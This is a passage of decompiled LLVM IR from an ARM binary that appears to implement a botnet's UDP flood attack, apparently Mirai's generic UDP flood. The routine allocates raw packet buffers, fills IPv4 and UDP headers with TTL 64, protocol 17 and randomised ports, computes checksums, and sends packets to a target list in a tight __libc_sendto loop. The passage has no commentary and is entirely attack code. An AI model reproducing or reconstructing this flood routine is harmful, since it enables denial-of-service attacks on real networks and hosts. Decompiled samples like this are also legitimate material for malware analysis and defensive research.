  %v1_9118 = urem i32 %v0_9118, 256
  store i32 %v1_9118, i32* @r7, align 4
  %v3_911c = urem i32 %v0_90fc, 65536
  store i32 %v3_911c, i32* %r3.global-to-local, align 4
  %v3_9120 = urem i32 %v0_9110, 65536
  store i32 %v3_9120, i32* %ip.global-to-local, align 4
  %v2_9124 = icmp eq i32 %arg2, 0
  store i1 %v2_9124, i1* %cpsr_z.global-to-local, align 1
  %v0_9134 = load i32, i32* @sb, align 4
  store i32 %v0_9134, i32* %stack_var_-44, align 4
  %v3_9138 = urem i32 %v7_8fbc, 65536
  store i32 %v3_9138, i32* @fp, align 4
  br i1 %v2_9124, label %dec_label_pc_932c.preheader, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_90fc
  %v3_9110 = mul i32 %v0_9110, 65536
  %v3_90fc = mul i32 %v0_90fc, 65536
  %v3_914c = mul i32 %v6_904c, 65536
  %v1_9150 = add i32 %v3_914c, 3407872
  %tmp68 = udiv i32 %v1_9150, 256
  %v3_915c = and i32 %tmp68, 65280
  %v7_8fbc.not = or i32 %v7_8fbc, -65536
  %v1_9160 = xor i32 %v7_8fbc.not, 65535
  %v4_9164 = udiv i32 %v1_9150, 16777216
  %v5_9164 = or i32 %v3_915c, %v4_9164
  store i32 %v3_9114, i32* %r3.global-to-local, align 4
  %tmp69 = mul i32 %v7_8fbc, 256
  %v3_917c = and i32 %tmp69, 65280
  %tmp70 = mul nsw i32 %v1_9160, 256
  %v3_9180 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v7_8fbc, 256
  %v4_9184 = urem i32 %tmp71, 256
  %v5_9184 = or i32 %v4_9184, %v3_917c
  %tmp72 = udiv i32 %v1_9160, 256
  %v4_918c = urem i32 %tmp72, 256
  %v5_918c = or i32 %v4_918c, %v3_9180
  store i32 %v5_918c, i32* @r6, align 4
  store i32 %v3_90fc, i32* %r1.global-to-local, align 4
  store i32 %v3_9110, i32* %r2.global-to-local, align 4
  %v1_91a0 = add i32 %v3_914c, 524288
  %tmp73 = mul i32 %v0_90fc, 256
  %v3_91a4 = and i32 %tmp73, 65280
  %v1_91a8 = add i32 %v3_914c, 1835008
  store i32 %v1_91a8, i32* @r5, align 4
  %tmp74 = mul i32 %v0_9110, 256
  %v3_91ac = and i32 %tmp74, 65280
  %v3_91b4 = udiv i32 %v1_91a8, 256
  %tmp75 = udiv i32 %v0_90fc, 256
  %v4_91b8 = urem i32 %tmp75, 256
  %v5_91b8 = or i32 %v4_91b8, %v3_91a4
  %tmp76 = udiv i32 %v0_9110, 256
  %v4_91bc = urem i32 %tmp76, 256
  %v5_91bc = or i32 %v4_91bc, %v3_91ac
  store i32 %v5_91bc, i32* %ip.global-to-local, align 4
  %v1_91c0 = and i32 %v3_91b4, 65280
  %tmp77 = udiv i32 %v1_91a0, 256
  %v3_91c4 = and i32 %tmp77, 65280
  store i32 %v3_91c4, i32* @lr, align 4
  %v4_91d8 = udiv i32 %v1_91a0, 16777216
  %v5_91d8 = or i32 %v3_91c4, %v4_91d8
  store i32 %v5_91d8, i32* @r7, align 4
  %v4_91dc = udiv i32 %v1_91a8, 16777216
  %v5_91dc = or i32 %v1_91c0, %v4_91dc
  store i32 %v5_91dc, i32* @r8, align 4
  store i32 %v0_9134, i32* @r4, align 4
  %v1_9240 = trunc i32 %v6_8fd4 to i8
  %sext = mul nuw i32 %v5_9164, 65536
  %v4_9248 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_9184, 65536
  %v4_924c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_918c, 65536
  %v4_92b4 = sdiv i32 %sext9, 65536
  %v2_92e4 = icmp eq i32 %v1_9118, 0
  %sext10 = mul nuw i32 %v5_91b8, 65536
  %v4_9308 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_91bc, 65536
  %v4_9310 = sdiv i32 %sext11, 65536
  %extract.t = trunc i32 %v4_9248 to i16
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %bb82, %dec_label_pc_9148
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_91f0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8f80, i32* %ip.global-to-local, align 4
  %v2_91fc = load i32, i32* @r4, align 4
  %v5_91fc = mul i32 %v2_91fc, 4
  %v6_91fc = add i32 %v5_91fc, %v2_8f80
  %v7_91fc = inttoptr i32 %v6_91fc to i32*
  store i32 %v2_91f0, i32* %v7_91fc, align 4
  %v3_9200 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9200, i32* %r3.global-to-local, align 4
  %v0_9204 = load i32, i32* %ip.global-to-local, align 4
  %v4_9204 = mul i32 %v3_9200, 4
  %v5_9204 = add i32 %v0_9204, %v4_9204
  %v6_9204 = inttoptr i32 %v5_9204 to i32*
  %v7_9204 = load i32, i32* %v6_9204, align 4
  store i32 %v7_9204, i32* %r4.global-to-local, align 4
  %v1_9208 = inttoptr i32 %v7_9204 to i8*
  %v2_9208 = load i8, i8* %v1_9208, align 1
  %tmp = urem i8 %v2_9208, 16
  %v1_920c = zext i8 %tmp to i32
  %v1_9210 = or i32 %v1_920c, 64
  store i32 %v1_9210, i32* %r2.global-to-local, align 4
  %v1_9214 = trunc i32 %v1_9210 to i8
  store i8 %v1_9214, i8* %v1_9208, align 1
  %v0_9218 = load i32, i32* %r3.global-to-local, align 4
  %v5_921c = mul i32 %v0_9218, 24
  store i32 %v5_921c, i32* %r1.global-to-local, align 4
  %v0_9220 = load i32, i32* %r4.global-to-local, align 4
  %v1_9220 = inttoptr i32 %v0_9220 to i8*
  %v2_9220 = load i8, i8* %v1_9220, align 1
  %v1_9224 = and i8 %v2_9220, -16
  %v1_9228 = or i8 %v1_9224, 5
  store i32 %v1_9000, i32* %lr.global-to-local, align 4
  store i8 %v1_9228, i8* %v1_9220, align 1
  store i32 %v6_8f98, i32* %r2.global-to-local, align 4
  %v2_9238 = load i32, i32* %r4.global-to-local, align 4
  %v3_9238 = add i32 %v2_9238, 1
  %v4_9238 = inttoptr i32 %v3_9238 to i8*
  store i8 %v5_8fb8, i8* %v4_9238, align 1
  store i32 %v1_8fdc, i32* %r3.global-to-local, align 4
  %v2_9240 = load i32, i32* %r4.global-to-local, align 4
  %v3_9240 = add i32 %v2_9240, 8
  %v4_9240 = inttoptr i32 %v3_9240 to i8*
  store i8 %v1_9240, i8* %v4_9240, align 1
  %v0_9244 = load i32, i32* %lr.global-to-local, align 4
  %v2_9244 = icmp eq i32 %v0_9244, 0
  store i1 %v2_9244, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9248, i32* %ip.global-to-local, align 4
  store i32 %v4_924c, i32* %lr.global-to-local, align 4
  br i1 %v2_9244, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_91e4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9254 = load i32, i32* %r4.global-to-local, align 4
  %v4_9254 = add i32 %v3_9254, 6
  %v5_9254 = inttoptr i32 %v4_9254 to i16*
  store i16 64, i16* %v5_9254, align 2
  %v0_9258.pre = load i32, i32* %ip.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_9258.pre to i16
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_91e4, %bb
  %v0_9258.off0 = phi i16 [ %extract.t, %dec_label_pc_91e4 ], [ %extract.t27, %bb ]
  %v2_9258 = load i32, i32* %r4.global-to-local, align 4
  %v3_9258 = add i32 %v2_9258, 2
  %v4_9258 = inttoptr i32 %v3_9258 to i16*
  store i16 %v0_9258.off0, i16* %v4_9258, align 2
  %v0_925c = load i32, i32* %r4.global-to-local, align 4
  %v1_925c = add i32 %v0_925c, 20
  store i32 %v1_925c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_9268 = add i32 %v0_925c, 9
  %v4_9268 = inttoptr i32 %v3_9268 to i8*
  store i8 47, i8* %v4_9268, align 1
  %v0_926c = load i32, i32* %lr.global-to-local, align 4
  %v1_926c = trunc i32 %v0_926c to i16
  %v2_926c = load i32, i32* %r4.global-to-local, align 4
  %v3_926c = add i32 %v2_926c, 4
  %v4_926c = inttoptr i32 %v3_926c to i16*
  store i16 %v1_926c, i16* %v4_926c, align 2
  %v0_9270 = load i32, i32* %ip.global-to-local, align 4
  %v1_9270 = trunc i32 %v0_9270 to i16
  %v2_9270 = load i32, i32* %r2.global-to-local, align 4
  %v3_9270 = add i32 %v2_9270, 2
  %v4_9270 = inttoptr i32 %v3_9270 to i16*
  store i16 %v1_9270, i16* %v4_9270, align 2
  store i32 %v6_90a0, i32* %lr.global-to-local, align 4
  %v0_9278 = load i32, i32* %r4.global-to-local, align 4
  %v1_9278 = add i32 %v0_9278, 24
  %v2_9278 = inttoptr i32 %v1_9278 to i8*
  %v3_9278 = load i8, i8* %v2_9278, align 1
  %v4_9278 = zext i8 %v3_9278 to i32
  store i32 %v4_9278, i32* %r2.global-to-local, align 4
  %v2_927c = add i32 %v0_9278, 12
  %v3_927c = inttoptr i32 %v2_927c to i32*
  store i32 %v6_90a0, i32* %v3_927c, align 4
  %v0_9280 = load i32, i32* %r2.global-to-local, align 4
  %v1_9280 = and i32 %v0_9280, -241
  %v1_9284 = or i32 %v1_9280, 64
  store i32 %v1_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* %r1.global-to-local, align 4
  %v1_9288 = load i32, i32* @sl, align 4
  %v2_9288 = add i32 %v1_9288, %v0_9288
  store i32 %v2_9288, i32* %r1.global-to-local, align 4
  %v1_928c = add i32 %v2_9288, 16
  %v2_928c = inttoptr i32 %v1_928c to i32*
  %v3_928c = load i32, i32* %v2_928c, align 4
  store i32 %v3_928c, i32* %r1.global-to-local, align 4
  %v1_9290 = trunc i32 %v1_9284 to i8
  %v2_9290 = load i32, i32* %r4.global-to-local, align 4
  %v3_9290 = add i32 %v2_9290, 24
  %v4_9290 = inttoptr i32 %v3_9290 to i8*
  store i8 %v1_9290, i8* %v4_9290, align 1
  %v0_9294 = load i32, i32* %r4.global-to-local, align 4
  %v1_9294 = add i32 %v0_9294, 24
  %v2_9294 = inttoptr i32 %v1_9294 to i8*
  %v3_9294 = load i8, i8* %v2_9294, align 1
  %v1_9298 = and i8 %v3_9294, -16
  %v1_929c = or i8 %v1_9298, 5
  store i8 %v1_929c, i8* %v2_9294, align 1
  %v0_92a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_92a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_92a4 = add i32 %v1_92a4, 16
  %v3_92a4 = inttoptr i32 %v2_92a4 to i32*
  store i32 %v0_92a4, i32* %v3_92a4, align 4
  store i32 %v6_8f98, i32* %r1.global-to-local, align 4
  %v0_92ac = load i32, i32* %r4.global-to-local, align 4
  %v1_92ac = add i32 %v0_92ac, 24
  store i32 %v1_92ac, i32* @r5, align 4
  %v3_92b0 = add i32 %v0_92ac, 25
  %v4_92b0 = inttoptr i32 %v3_92b0 to i8*
  store i8 %v5_8fb8, i8* %v4_92b0, align 1
  store i32 %v4_92b4, i32* %r2.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r8, align 4
  %v1_92b8 = trunc i32 %v0_92b8 to i16
  %v2_92b8 = load i32, i32* @r5, align 4
  %v3_92b8 = add i32 %v2_92b8, 2
  %v4_92b8 = inttoptr i32 %v3_92b8 to i16*
  store i16 %v1_92b8, i16* %v4_92b8, align 2
  %v0_92bc = load i32, i32* %r2.global-to-local, align 4
  %v1_92bc = trunc i32 %v0_92bc to i16
  %v2_92bc = load i32, i32* @r5, align 4
  %v3_92bc = add i32 %v2_92bc, 4
  %v4_92bc = inttoptr i32 %v3_92bc to i16*
  store i16 %v1_92bc, i16* %v4_92bc, align 2
  store i32 %v1_8fdc, i32* %r3.global-to-local, align 4
  %v0_92c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_92c4, label %bb79, label %bb78

bb78:                                             ; preds = %.thread
  store i32 64, i32* %ip.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread, %bb78
  %v2_92c8 = load i32, i32* @r5, align 4
  %v3_92c8 = add i32 %v2_92c8, 8
  %v4_92c8 = inttoptr i32 %v3_92c8 to i8*
  store i8 %v1_9240, i8* %v4_92c8, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_92d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_92d0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_92d0 = load i32, i32* %ip.global-to-local, align 4
  %v2_92d0 = trunc i32 %v1_92d0 to i16
  %v3_92d0 = load i32, i32* @r5, align 4
  %v4_92d0 = add i32 %v3_92d0, 6
  %v5_92d0 = inttoptr i32 %v4_92d0 to i16*
  store i16 %v2_92d0, i16* %v5_92d0, align 2
  %v0_92d4.pre = load i32, i32* %r3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_92d4.pre to i8
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_92d4.off0 = phi i8 [ 17, %bb79 ], [ %extract.t28, %bb80 ]
  %v2_92d4 = load i32, i32* @r5, align 4
  %v3_92d4 = add i32 %v2_92d4, 9
  %v4_92d4 = inttoptr i32 %v3_92d4 to i8*
  store i8 %v0_92d4.off0, i8* %v4_92d4, align 1
  %v0_92d8 = call i32 @rand_next()
  store i32 %v1_9118, i32* @lr, align 4
  store i1 %v2_92e4, i1* %cpsr_z.global-to-local, align 1
  %v1_92e8 = sub i32 1023, %v0_92d8
  store i32 %v1_92e8, i32* %r3.global-to-local, align 4
  br i1 %v2_92e4, label %.thread12, label %.thread13

.thread12:                                        ; preds = %bb81
  %v2_92f0 = load i32, i32* @r5, align 4
  %v3_92f0 = add i32 %v2_92f0, 16
  %v4_92f0 = inttoptr i32 %v3_92f0 to i32*
  store i32 %v1_92e8, i32* %v4_92f0, align 4
  br label %bb82

.thread13:                                        ; preds = %bb81
  %v1_92ec = load i32, i32* %r4.global-to-local, align 4
  %v2_92ec = add i32 %v1_92ec, 16
  %v3_92ec = inttoptr i32 %v2_92ec to i32*
  %v4_92ec = load i32, i32* %v3_92ec, align 4
  store i32 %v4_92ec, i32* %r3.global-to-local, align 4
  %v2_92f4 = load i32, i32* @r5, align 4
  %v3_92f4 = add i32 %v2_92f4, 16
  %v4_92f4 = inttoptr i32 %v3_92f4 to i32*
  store i32 %v4_92ec, i32* %v4_92f4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread12, %.thread13
  %v1_92f8 = load i32, i32* @r5, align 4
  %v2_92f8 = add i32 %v1_92f8, 12
  %v3_92f8 = inttoptr i32 %v2_92f8 to i32*
  store i32 %v0_92d8, i32* %v3_92f8, align 4
  %v3_92fc = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_9304 = load i32, i32* %r4.global-to-local, align 4
  %v1_9304 = add i32 %v0_9304, 44
  store i32 %v1_9304, i32* @r6, align 4
  store i32 %v4_9308, i32* %r2.global-to-local, align 4
  %v1_930c = add i32 %v3_92fc, 1
  store i32 %v1_930c, i32* @r4, align 4
  store i32 %v4_9310, i32* %r3.global-to-local, align 4
  %v9_9314 = icmp eq i32 %v1_930c, %arg2
  store i1 %v9_9314, i1* %cpsr_z.global-to-local, align 1
  %v0_9318 = load i32, i32* @r7, align 4
  %v1_9318 = trunc i32 %v0_9318 to i16
  %v3_9318 = add i32 %v0_9304, 48
  %v4_9318 = inttoptr i32 %v3_9318 to i16*
  store i16 %v1_9318, i16* %v4_9318, align 2
  %v0_931c = load i32, i32* %r2.global-to-local, align 4
  %v1_931c = trunc i32 %v0_931c to i16
  %v2_931c = load i32, i32* @r6, align 4
  %v3_931c = inttoptr i32 %v2_931c to i16*
  store i16 %v1_931c, i16* %v3_931c, align 2
  %v0_9320 = load i32, i32* %r3.global-to-local, align 4
  %v1_9320 = trunc i32 %v0_9320 to i16
  %v2_9320 = load i32, i32* @r6, align 4
  %v3_9320 = add i32 %v2_9320, 2
  %v4_9320 = inttoptr i32 %v3_9320 to i16*
  store i16 %v1_9320, i16* %v4_9320, align 2
  %v0_9324 = load i32, i32* @r4, align 4
  store i32 %v0_9324, i32* %stack_var_-44, align 4
  %v5_9328 = icmp slt i32 %v1_930c, %arg2
  br i1 %v5_9328, label %dec_label_pc_91e4, label %dec_label_pc_932c.preheader

dec_label_pc_932c.preheader:                      ; preds = %bb82, %dec_label_pc_90fc
  %v1_9348 = add i32 %v6_904c, 8
  %v1_934c = add i32 %v6_904c, 52
  %v2_9358 = icmp eq i32 %v6_90a0, -1
  %v7_9358 = icmp eq i32 %v6_90a0, -1
  %v2_953c = icmp eq i32 %v1_9118, 0
  %v2_9558 = icmp eq i32 %v1_906c, 0
  br label %dec_label_pc_932c

dec_label_pc_932c:                                ; preds = %dec_label_pc_932c.preheader, %dec_label_pc_9584
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_9124, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9124, label %dec_label_pc_9584, label %dec_label_pc_9340

dec_label_pc_9340:                                ; preds = %dec_label_pc_932c
  store i32 %v6_904c, i32* %lr.global-to-local, align 4
  store i32 %v1_9348, i32* @sb, align 4
  store i32 %v1_934c, i32* @r8, align 4
  br label %dec_label_pc_9458

dec_label_pc_9354:                                ; preds = %dec_label_pc_9458
  store i32 %v6_90a0, i32* %r2.global-to-local, align 4
  store i1 %v7_9358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9358, label %dec_label_pc_94e0, label %dec_label_pc_9360

dec_label_pc_9360:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9354
  store i32 65535, i32* @r4, align 4
  %v0_9368 = load i32, i32* @fp, align 4
  %v9_9368 = icmp eq i32 %v0_9368, 65535
  store i1 %v9_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9368, label %dec_label_pc_94f8, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_94e0.dec_label_pc_9370_crit_edge, %dec_label_pc_9360
  %v1_9374 = phi i32 [ %v1_9374.pre, %dec_label_pc_94e0.dec_label_pc_9370_crit_edge ], [ 65535, %dec_label_pc_9360 ]
  store i32 %v3_911c, i32* %r3.global-to-local, align 4
  %v9_9374 = icmp eq i32 %v3_911c, %v1_9374
  store i1 %v9_9374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9374, label %dec_label_pc_9520, label %dec_label_pc_937c

dec_label_pc_937c:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9370
  %v1_9380 = phi i32 [ %v1_9518, %dec_label_pc_94f8 ], [ %v1_9374, %dec_label_pc_9370 ]
  store i32 %v3_9120, i32* %ip.global-to-local, align 4
  %v9_9380 = icmp eq i32 %v3_9120, %v1_9380
  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9534, label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9520, %dec_label_pc_937c
  store i32 %v1_9118, i32* @lr, align 4
  store i1 %v2_953c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_953c, label %dec_label_pc_9550, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_9388
  %v1_9390 = load i32, i32* @r5, align 4
  %v2_9390 = add i32 %v1_9390, 16
  %v3_9390 = inttoptr i32 %v2_9390 to i32*
  %v4_9390 = load i32, i32* %v3_9390, align 4
  store i32 %v4_9390, i32* %r3.global-to-local, align 4
  %v2_9394 = load i32, i32* @r6, align 4
  %v3_9394 = add i32 %v2_9394, 16
  %v4_9394 = inttoptr i32 %v3_9394 to i32*
  store i32 %v4_9390, i32* %v4_9394, align 4
  br label %dec_label_pc_939c

dec_label_pc_939c:                                ; preds = %bb85, %.thread14
  store i32 %v1_906c, i32* %r1.global-to-local, align 4
  store i1 %v2_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9558, label %dec_label_pc_93a8, label %dec_label_pc_9564

dec_label_pc_93a8:                                ; preds = %dec_label_pc_939c, %dec_label_pc_9550, %dec_label_pc_9564
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_93ac = load i32, i32* @r5, align 4
  %v3_93ac = add i32 %v2_93ac, 10
  %v4_93ac = inttoptr i32 %v3_93ac to i16*
  store i16 0, i16* %v4_93ac, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_93b4 = load i32, i32* @r5, align 4
  store i32 %v0_93b4, i32* @r0, align 4
  %v2_93b8 = call i32 @checksum_generic(i32 %v0_93b4, i32 20)
  %v3_93b8 = trunc i32 %v2_93b8 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_93c0 = load i32, i32* @r5, align 4
  %v4_93c0 = add i32 %v3_93c0, 10
  %v5_93c0 = inttoptr i32 %v4_93c0 to i16*
  store i16 %v3_93b8, i16* %v5_93c0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_93c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_93c8 = trunc i32 %v0_93c8 to i16
  %v2_93c8 = load i32, i32* @r6, align 4
  %v3_93c8 = add i32 %v2_93c8, 10
  %v4_93c8 = inttoptr i32 %v3_93c8 to i16*
  store i16 %v1_93c8, i16* %v4_93c8, align 2
  %v0_93cc = load i32, i32* @r6, align 4
  store i32 %v0_93cc, i32* @r0, align 4
  %v2_93d0 = call i32 @checksum_generic(i32 %v0_93cc, i32 20)
  %v3_93d0 = trunc i32 %v2_93d0 to i16
  %v3_93d4 = load i32, i32* @r6, align 4
  %v4_93d4 = add i32 %v3_93d4, 10
  %v5_93d4 = inttoptr i32 %v4_93d4 to i16*
  store i16 %v3_93d0, i16* %v5_93d4, align 2
  %v2_93dc = load i32, i32* @r7, align 4
  %v3_93dc = add i32 %v2_93dc, 6
  %v4_93dc = inttoptr i32 %v3_93dc to i16*
  store i16 0, i16* %v4_93dc, align 2
  %v0_93e0 = load i32, i32* @r7, align 4
  store i32 %v0_93e0, i32* @r1, align 4
  %v1_93e4 = add i32 %v0_93e0, 4
  %v2_93e4 = inttoptr i32 %v1_93e4 to i16*
  %v3_93e4 = load i16, i16* %v2_93e4, align 2
  %v4_93e4 = zext i16 %v3_93e4 to i32
  store i32 %v4_93e4, i32* %r2.global-to-local, align 4
  %v0_93e8 = load i32, i32* @sb, align 4
  store i32 %v0_93e8, i32* %r3.global-to-local, align 4
  %v0_93ec = load i32, i32* @r6, align 4
  %v4_93f0 = call i32 @checksum_tcpudp(i32 %v0_93ec, i32 %v0_93e0, i32 %v4_93e4, i32 %v0_93e8)
  %v5_93f0 = trunc i32 %v4_93f0 to i16
  %v3_93f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_93f4, i32* %r2.global-to-local, align 4
  %v3_93f8 = mul i32 %v3_93f4, 32
  store i32 %v3_93f8, i32* %r3.global-to-local, align 4
  %v0_93fc = load i32, i32* @r5, align 4
  %v1_93fc = add i32 %v0_93fc, 16
  %v2_93fc = inttoptr i32 %v1_93fc to i32*
  %v3_93fc = load i32, i32* %v2_93fc, align 4
  %v5_9400 = mul i32 %v3_93f4, 24
  store i32 %v5_9400, i32* %r3.global-to-local, align 4
  %v1_9404 = load i32, i32* @sl, align 4
  %v2_9404 = add i32 %v1_9404, %v5_9400
  store i32 %v2_9404, i32* @lr, align 4
  %v2_9408 = add i32 %v2_9404, 4
  %v3_9408 = inttoptr i32 %v2_9408 to i32*
  store i32 %v3_93fc, i32* %v3_9408, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9414 = load i32, i32* @r7, align 4
  %v4_9414 = add i32 %v3_9414, 6
  %v5_9414 = inttoptr i32 %v4_9414 to i16*
  store i16 %v5_93f0, i16* %v5_9414, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_941c = load i32, i32* %r1.global-to-local, align 4
  %v1_941c = trunc i32 %v0_941c to i16
  %v2_941c = load i32, i32* %r3.global-to-local, align 4
  %v3_941c = load i32, i32* @sl, align 4
  %v4_941c = add i32 %v3_941c, %v2_941c
  %v5_941c = inttoptr i32 %v4_941c to i16*
  store i16 %v1_941c, i16* %v5_941c, align 2
  %v0_9420 = load i32, i32* %r2.global-to-local, align 4
  %v1_9420 = trunc i32 %v0_9420 to i16
  %v2_9420 = load i32, i32* @lr, align 4
  %v3_9420 = add i32 %v2_9420, 2
  %v4_9420 = inttoptr i32 %v3_9420 to i16*
  store i16 %v1_9420, i16* %v4_9420, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9428 = load i32, i32* @r5, align 4
  store i32 %v0_9428, i32* %r1.global-to-local, align 4
  %v0_9430 = load i32, i32* @r8, align 4
  store i32 %v0_9430, i32* %r2.global-to-local, align 4
  %v0_9434 = load i32, i32* @lr, align 4
  %v0_9438 = load i32, i32* %ip.global-to-local, align 4
  %v6_943c = call i32 @__libc_sendto(i32 %v3_90c4, i32 %v0_9428, i32 %v0_9430, i32 16384, i32 %v0_9434, i32 %v0_9438)
  %v3_9440 = load i32, i32* %stack_var_-44, align 4
  %v1_9444 = add i32 %v3_9440, 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_944c = icmp eq i32 %v1_9444, %arg2
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9444, i32* %stack_var_-44, align 4
  %v6_9454 = icmp slt i32 %v1_9444, %arg2
  br i1 %v6_9454, label %dec_label_pc_9458, label %dec_label_pc_9584

dec_label_pc_9458:                                ; preds = %dec_label_pc_93a8, %dec_label_pc_9340
  %v1_946c = phi i32 [ %v1_9444, %dec_label_pc_93a8 ], [ 0, %dec_label_pc_9340 ]
  %v5_945c = mul i32 %v1_946c, 24
  %v1_9460 = load i32, i32* @sl, align 4
  %v2_9460 = add i32 %v1_9460, %v5_945c
  store i32 %v2_9460, i32* %r3.global-to-local, align 4
  store i32 %v2_8f80, i32* %r1.global-to-local, align 4
  %v1_9468 = add i32 %v2_9460, 20
  %v2_9468 = inttoptr i32 %v1_9468 to i8*
  %v3_9468 = load i8, i8* %v2_9468, align 1
  %v4_9468 = zext i8 %v3_9468 to i32
  store i32 %v4_9468, i32* %r2.global-to-local, align 4
  %v4_946c = mul i32 %v1_946c, 4
  %v5_946c = add i32 %v4_946c, %v2_8f80
  %v6_946c = inttoptr i32 %v5_946c to i32*
  %v7_946c = load i32, i32* %v6_946c, align 4
  store i32 %v7_946c, i32* @r5, align 4
  %v2_9470 = icmp ugt i8 %v3_9468, 30
  %v7_9470 = icmp eq i8 %v3_9468, 31
  store i1 %v7_9470, i1* %cpsr_z.global-to-local, align 1
  %v1_9474 = add i32 %v7_946c, 24
  store i32 %v1_9474, i32* @r6, align 4
  %v1_9478 = add i32 %v7_946c, 44
  store i32 %v1_9478, i32* @r7, align 4
  %v2_947c = xor i1 %v7_9470, true
  %v3_947c = and i1 %v2_9470, %v2_947c
  br i1 %v3_947c, label %dec_label_pc_9354, label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %dec_label_pc_9458
  %v1_9480 = add i32 %v2_9460, 16
  %v2_9480 = inttoptr i32 %v1_9480 to i32*
  %v3_9480 = load i32, i32* %v2_9480, align 4
  store i32 %v3_9480, i32* %r4.global-to-local, align 4
  %v0_9484 = call i32 @rand_next()
  %v3_9488 = load i32, i32* %stack_var_-44, align 4
  %v5_9490 = mul i32 %v3_9488, 24
  %v1_9494 = and i32 %v3_9480, 16711680
  store i32 %v1_9494, i32* %ip.global-to-local, align 4
  %v3_9498 = udiv i32 %v3_9480, 16777216
  %v4_949c = udiv i32 %v1_9494, 256
  %v5_949c = or i32 %v4_949c, %v3_9498
  store i32 %v5_949c, i32* %r2.global-to-local, align 4
  %v1_94a0 = load i32, i32* @sl, align 4
  %v2_94a0 = add i32 %v1_94a0, %v5_9490
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_94a4 = and i32 %v3_9480, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_94a4, i32* %r3.global-to-local, align 4
  %v1_94a8 = add i32 %v2_94a0, 20
  %v2_94a8 = inttoptr i32 %v1_94a8 to i8*
  %v3_94a8 = load i8, i8* %v2_94a8, align 1
  %v4_94a8 = zext i8 %v3_94a8 to i32
  store i32 %v4_94a8, i32* %ip.global-to-local, align 4
  %v4_94ac = mul i32 %v1_94a4, 256
  %v4_94b0 = mul i32 %v3_9480, 16777216
  %v5_94ac = or i32 %v4_94ac, %v4_94b0
  %v5_94b0 = or i32 %v5_94ac, %v5_949c
  %v7_94b4 = lshr i32 %v0_9484, %v4_94a8
  %v8_94b4 = add i32 %v7_94b4, %v5_94b0
  %v1_94c0 = and i32 %v8_94b4, 65280
  store i32 %v1_94c0, i32* %r1.global-to-local, align 4
  %v5_94cc = call i32 @llvm.bswap.i32(i32 %v8_94b4)
  store i32 %v5_94cc, i32* %r3.global-to-local, align 4
  store i32 %v6_90a0, i32* %r2.global-to-local, align 4
  store i1 %v7_9358, i1* %cpsr_z.global-to-local, align 1
  %v1_94d8 = load i32, i32* @r5, align 4
  %v2_94d8 = add i32 %v1_94d8, 16
  %v3_94d8 = inttoptr i32 %v2_94d8 to i32*
  store i32 %v5_94cc, i32* %v3_94d8, align 4
  br i1 %v2_9358, label %dec_label_pc_94e0, label %dec_label_pc_9360

dec_label_pc_94e0:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9354
  %v0_94e0 = call i32 @rand_next()
  store i32 65535, i32* @r4, align 4
  %v0_94ec = load i32, i32* @fp, align 4
